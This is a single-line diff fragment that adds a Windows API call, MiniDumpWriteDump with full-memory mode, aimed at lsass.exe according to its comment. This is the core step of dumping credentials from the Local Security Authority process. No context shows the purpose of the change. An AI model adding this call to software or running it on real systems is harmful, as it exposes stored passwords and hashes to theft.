@@ -1,0 +1,1 @@
+MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, 0, 0, 0); // C:\Windows\System32\lsass.exe
